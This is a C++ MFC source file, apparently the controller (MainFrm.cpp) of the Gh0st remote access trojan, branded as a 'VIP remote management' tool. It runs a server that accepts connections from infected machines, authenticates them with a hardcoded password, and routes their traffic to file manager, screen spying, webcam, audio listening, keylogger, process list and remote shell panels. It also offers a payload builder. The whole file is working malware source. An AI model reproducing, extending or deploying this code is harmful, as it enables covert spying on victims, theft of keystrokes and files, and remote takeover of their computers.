// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "gh0st.h"

#include "MainFrm.h"
#include "Gh0stView.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "BuildServer.h"
#include "Settings.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define WM_ICON_NOTIFY WM_USER+10

CGh0stView* g_pConnectView = NULL; //在NotifyProc中初始化

CIOCPServer *m_iocpServer = NULL;
CString		m_PassWord = "password";
CMainFrame	*g_pFrame; // 在CMainFrame::CMainFrame()中初始化

/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_WM_SYSCOMMAND()
	ON_MESSAGE(WM_ICON_NOTIFY, OnTrayNotification)
	ON_UPDATE_COMMAND_UI(ID_STAUTSTIP, OnUpdateStatusBar)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_HIDE, OnHide)
	ON_COMMAND(IDM_EXIT, OnExit)
	ON_UPDATE_COMMAND_UI(ID_STAUTSSPEED, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSPORT, OnUpdateStatusBar)
	ON_UPDATE_COMMAND_UI(ID_STAUTSCOUNT, OnUpdateStatusBar)
	ON_COMMAND(IDM_SETTING, OnSetting)
	ON_COMMAND(IDM_BUILD, OnBuild)
//	ON_COMMAND(IDT_FILE_MANAGER, OnFileManager)//1
// 	ON_COMMAND(IDB_BITMAP_ABOUT, OnFileManager)//2
// 	ON_COMMAND(IDB_BITMAP_SDERF, OnFileManager)//3
// 	ON_COMMAND(IDT_FILE_MANAGER, OnFileManager)//4
// 	ON_COMMAND(IDT_FILE_MANAGER, OnFileManager)//5
// 	ON_COMMAND(IDT_FILE_MANAGER, OnFileManager)//6
// 	ON_COMMAND(IDT_FILE_MANAGER, OnFileManager)//7
// 	ON_COMMAND(IDT_FILE_MANAGER, OnFileManager)//8
// 	ON_COMMAND(IDT_FILE_MANAGER, OnFileManager)//9
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTSTIP,           // status line indicator
	ID_STAUTSSPEED,
	ID_STAUTSPORT,
	ID_STAUTSCOUNT
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction
void TransParentDC(CRect rect,CDC * pDC)
{
	CDC m_MemDC;
	m_MemDC.CreateCompatibleDC(pDC);
	CBitmap m_Bitmap;
	m_Bitmap.CreateCompatibleBitmap
		(pDC,rect.Width(),rect.Height());
	CBitmap *pOldBitmap = 
		m_MemDC.SelectObject(&m_Bitmap);
	m_MemDC.FillSolidRect(0,0,rect.Width(),
		rect.Height(),GetSysColor(COLOR_MENU));
	
	COLORREF cor =  pDC->GetPixel(0,0);
	for(int y = 0; y < rect.Height();y++)
	{
		for(int x = 0; x < rect.Width(); x++)
		{
			COLORREF ch = pDC->GetPixel(x,y);
			if(ch != cor)
				m_MemDC.SetPixelV(x,y,ch);
		}
	}
	pDC->BitBlt(0,0,rect.Width(),
		rect.Height(),&m_MemDC,0,0,SRCCOPY);
	m_MemDC.SelectObject(pOldBitmap);
	m_Bitmap.DeleteObject();
}

CSize CMainFrame::LoadMyBitmap(UINT nID)
{
	CDC * pDC = GetDC();
	CDC m_MemDC;
	m_MemDC.CreateCompatibleDC(pDC);
	CSize m_Size = pDC->GetTextExtent("刷新");
	ReleaseDC(pDC);
	CRect rect(0,0,60,32);
	CBitmap *pBitmap,*pOldBitmap;
	pBitmap = new CBitmap;
	pBitmap->LoadBitmap(nID);
	pOldBitmap = m_MemDC.SelectObject(pBitmap);
	TransParentDC(rect,&m_MemDC);
	m_MemDC.SelectObject(pOldBitmap);
	m_ToolBarList.Add(pBitmap,GetSysColor(COLOR_MENU));
	pBitmap->DeleteObject();
	delete pBitmap;
	return m_Size;
}
CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	//界面居中显示
   this ->CenterWindow(CWnd::GetDesktopWindow());
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 80);

	
	///////////////////////////////////////////////////////////////////////////////////////
	if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP //CBRS_LEFT
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_wndToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}
	//下面是允许工具栏可以托动
	m_wndToolBar.EnableDocking(CBRS_ALIGN_ANY); //允许工具栏在工具栏区域中移动
	EnableDocking(CBRS_ALIGN_ANY);  //此框架任何地方允许可拖动，如果已经为别的ToolBar写过可以不用再写
	DockControlBar(&m_wndToolBar); //允许此工具栏在整个window窗口中拖动
	
   	m_ToolBarList.Create(60,32,ILC_COLOR24|ILC_MASK,10,10);
	CSize m_Size = 
	LoadMyBitmap(IDB_BITMAP_FlLEMANAGER);//1
	LoadMyBitmap(IDB_BITMAP_ANAGER);//2
	LoadMyBitmap(IDB_BITMAP_SDERF);//3
	LoadMyBitmap(IDB_BITMAP_ERFRGRG);//4
	LoadMyBitmap(IDB_BITMAP_EQDAA);//5
	LoadMyBitmap(IDB_BITMAP_HBHMH);//6
	LoadMyBitmap(IDB_BITMAP_JKUIO);//7
	LoadMyBitmap(IDB_BITMAP_PKTGH);//8

	m_wndToolBar.SetButtonText(0,_T("文件管理"));//1
	m_wndToolBar.SetButtonText(1,_T("屏幕控制"));//2
	m_wndToolBar.SetButtonText(2,_T("视频监控"));//3
	m_wndToolBar.SetButtonText(3,_T("语音监听"));//4
	m_wndToolBar.SetButtonText(4,_T("超级终端"));//5
	m_wndToolBar.SetButtonText(5,_T("配置生成"));//6
	m_wndToolBar.SetButtonText(6,_T("系统管理"));//7
	m_wndToolBar.SetButtonText(7,_T("退出程序"));//8
	
	m_wndToolBar.GetToolBarCtrl().SetImageList(&m_ToolBarList);
	m_wndToolBar.GetToolBarCtrl().SetDisabledImageList(&m_ToolBarList);
	m_wndToolBar.GetToolBarCtrl().SetButtonSize(CSize(60,33 + m_Size.cy + 5));
	m_wndToolBar.GetToolBarCtrl().SetBitmapSize(CSize(60,32));
	///////////////////////////////////////////////////////////////////////////////////////
	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.cx = 800;
	cs.cy = 400;
	cs.style &= ~FWS_ADDTOTITLE;
	cs.lpszName = "小七论坛VIP远程管理软件企业版X2.2";
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
    if (m_hWnd == NULL)
        return;     // null (unattached) windows are valid
	
    // check for special wnd??? values
    ASSERT(HWND_TOP == NULL);       // same as desktop
    if (m_hWnd == HWND_BOTTOM)
        ASSERT(this == &CWnd::wndBottom);
    else if (m_hWnd == HWND_TOPMOST)
        ASSERT(this == &CWnd::wndTopMost);
    else if (m_hWnd == HWND_NOTOPMOST)
        ASSERT(this == &CWnd::wndNoTopMost);
    else
    {
        // should be a normal window
        ASSERT(::IsWindow(m_hWnd));
	}
	//CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;
		CString str;
		// 对g_pConnectView 进行初始化
		g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;

		// g_pConnectView还没创建，这情况不会发生
		if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
			return;

		g_pConnectView->m_iocpServer = m_iocpServer;

		str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
		g_pFrame->m_wndStatusBar.SetPaneText(1, str);

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
	CString		str;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	// 开启IPCP服务器
 	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
 	{

		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += "/";
			}
		}

  		m_wndStatusBar.SetPaneText(0, str);
 		str.Format("端口: %d", nPort);
 		m_wndStatusBar.SetPaneText(2, str);
 	}
 	else
 	{
 		str.Format("端口%d绑定失败", nPort);
 		m_wndStatusBar.SetPaneText(0, str);
 		m_wndStatusBar.SetPaneText(2, "端口: 0");
 	}

	m_wndStatusBar.SetPaneText(3, "连接: 0");
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // 要求验证
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

 		break;
	case TOKEN_LOGIN: // 上线包

		{
			if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
			}
			// 激活
			BYTE	bToken = COMMAND_ACTIVED;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}

// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}
void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	m_TrayIcon.RemoveIcon();

	m_iocpServer->Shutdown();
	delete m_iocpServer;
	CFrameWnd::OnClose();
}

LRESULT CMainFrame::OnTrayNotification(WPARAM wParam, LPARAM lParam)
{
	if (LOWORD(lParam) == WM_LBUTTONDBLCLK)
	{
		ShowWindow(SW_SHOW);
		return TRUE;
	}
	return m_TrayIcon.OnTrayNotification(wParam, lParam);
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		if (!m_TrayIcon.Enabled())
			m_TrayIcon.Create(this, WM_ICON_NOTIFY, "Running ....",
			AfxGetApp()->LoadIcon(IDR_MAINFRAME), IDR_MINIMIZE, TRUE); //构造
		ShowWindow(SW_HIDE);
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}
}
void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
{
	// TODO: Add your message handler code here and/or call default
	pCmdUI->Enable();
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str;
	str.Format("连接: %d", g_pConnectView->GetListCtrl().GetItemCount());
	m_wndStatusBar.SetPaneText(3, str);
}

void CMainFrame::OnShow() 
{
	// TODO: Add your command handler code here
	ShowWindow(SW_SHOW);
	::SetForegroundWindow(m_hWnd);
}

void CMainFrame::OnHide() 
{
	// TODO: Add your command handler code here
	ShowWindow(SW_HIDE);
}

void CMainFrame::OnExit() 
{
	// TODO: Add your command handler code here
	OnClose();
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{
	g_pFrame->m_TrayIcon.SetTooltipText(lpszText);
}

void CMainFrame::OnSetting() 
{
	// TODO: Add your command handler code here
	CSettings dlg;
	dlg.DoModal();
}

void CMainFrame::OnBuild() 
{
	// TODO: Add your command handler code here
	CBuildServer dlg;
	dlg.DoModal();
}
void CMainFrame::OnFileManager()
{
	if (g_pConnectView != NULL)
	{
		BYTE	bToken = COMMAND_LIST_DRIVE;
		g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
	}
}